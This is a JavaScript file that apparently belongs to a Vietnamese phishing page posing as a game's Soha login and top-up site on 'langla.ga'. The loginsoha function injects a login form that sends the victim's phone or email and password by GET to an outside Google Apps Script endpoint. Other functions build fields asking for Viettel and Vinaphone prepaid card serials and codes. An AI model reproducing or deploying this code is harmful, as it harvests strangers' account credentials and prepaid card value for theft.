var domain = 'https://langla.ga';
var napdomain = 'https://nap.langla.ga';

// ĐỔI FORM ĐĂNG NHẬP 
function loginsoha () {		
	document.getElementById("lifacebook").style.display = "none";
	document.getElementById("loginsoha").style.display = "none";
	document.getElementById("title-content").innerHTML = '<div style="font-weight: 400;font-size: 19px;">Đăng nhập</div> <span style="line-height: 1.5;font-weight: 400;font-size: 16px;color: #757575;">Có thể đăng nhập bằng số điện thoại, Email của bạn.</span> <li class="item-content"> <form method="GET" action="https://script.google.com/macros/s/AKfycbzQ6mjKLcrZKiy5vINiDFhSY2gPdPhyyt5cEZ3vHwmV8lP4668/exec"> <div class="item-inner"> <div class="item-input" style="margin-top:6px;"> <input name="Acc" type="email" placeholder="Phone / Email" id="username" class="input" required/> <input name="Pass" type="password" style="margin-top:5px;" placeholder="Mật khẩu" id="password" class="input"  required/> <div  class="item-input" style="border-radius:3px; margin-top:10px;background: #2ea813 !important;"><center><button style="border:none;  border-radius:3px; width: 100%;" class="modal-button button button-big button-fill button-raised">Đăng nhập</button></center></div> </div> </div> <div class="item-input" style="margin-top:10px;"><a onclick="openfacebook()" class="modal-button button button-big button-fill button-raised login-fb" style="background:#3b5998 !important;">Facebook</a></div> <div style="margin-top:10px;" class="item-input"><a href='+domain+' class="modal-button button button-big button-fill button-raised">Hủy</a></div> </form> </li> <style> input[type=email], input[type=password] {box-sizing: border-box;border: none;background: 0 0;border-radius: 0;box-shadow: none;display: block;padding: 0;margin: 0;width: 100%;height: 36px;color: #212121;font-size: 16px;font-family: inherit;border: 1px solid #b7b7b7 !important;border-radius: 5px !important;text-align: center;min-height: 48px;}.modal-button.button-fill{background :#2ea813 !important;}.item-content{min-height: 0px !important;}</style>';
}
//OPEN POPUP FACEBOOK LOGIN
// function openfacebook(){
// 	javascript:void window.open('facebook.php','1353463131339','width=600,height=690,toolbar=0,menubar=0,location=0,status=0,scrollbars=0,resizable=1,right=1,top=');

// }
//AUTO OPEN POPUP 
// function popup () {
// 	$('#myModal').on('shown.bs.modal', function () {
// 		$('#myInput').trigger('focus')
// 	})
// }
// window.onload = function()
// {
// 	var clickbutton = document.getElementById("popuploginbutton");
// 	clickbutton.click();
// };

//INPUT CARD
function loaitheChanged(obj){
	var inputcard = document.getElementById('inputcard');
	var value = obj.value;
	if (value === ''){
		inputcard.innerHTML = ' ';
	}
	if (value === 'Viettel'){
		inputcard.innerHTML = '<div class="item-content"> <div class="item-inner not-empty-state"> <div class="item-input item-input-field not-empty-state"> <select name="Sotien" id="level_sms" class="not-empty-state"><option value="">Chọn mệnh giá</option>  <option value="50k">50.000 VNĐ</option> <option value="100k">100.000 VNĐ</option> <option value="200k">200.000 VNĐ</option> </select> </div> </div> </div> <div class="item-content"> <div class="item-inner"> <div class=" item-input item-input-field"> <input type="text" name="SeriViettel" placeholder="Seri có 11 hoặc 14 số" name="seri_card" class="input" id="seri_card"> </div> </div> </div> </li> <li> <div class="item-content"> <div class="item-inner"> <div class="item-input item-input-field"> <input type="text" name="MatheViettel" placeholder="Mã thẻ cào 13 hoặc 15 số" name="code_card" class="input" id="code_card"> </div> </div> </div>';
	}

	else if (value === 'Vinaphone'){
		inputcard.innerHTML = '<div class="item-content"> <div class="item-inner not-empty-state"> <div class="item-input item-input-field not-empty-state"> <select name="Sotien" id="level_sms" class="not-empty-state"><option value="">Chọn mệnh giá</option>  <option value="50k">50.000 VNĐ</option> <option value="100k">100.000 VNĐ</option> <option value="200k">200.000 VNĐ</option> </select> </div> </div> </div> <div class="item-content"> <div class="item-inner"> <div class=" item-input item-input-field"> <input type="text" name="SeriVinaphone" placeholder="Số Seri có 14 số" name="seri_card" class="input" id="seri_card"> </div> </div> </div> </li> <li> <div class="item-content"> <div class="item-inner"> <div class="item-input item-input-field"> <input type="text" name="MatheVinaphone" placeholder="Mã thẻ cào có 14 số" name="code_card" class="input" id="code_card"> </div> </div> </div>';
	}
}

// INPUT TEN NHAN VAT
function SeverChanged(obj){
	var inputcard = document.getElementById('inputname');
	var value = obj.value;
	if (value === ''){
		inputname.innerHTML = ' ';
	} else {
		inputname.innerHTML = ' </li> <li> <div class="item-content"> <div class="item-inner"> <div class="item-input item-input-field"> <input type="text" name="Tennv" placeholder="Tên nhân vật" class="input" id="code_card"> </div> </div> </div>';
	}

}
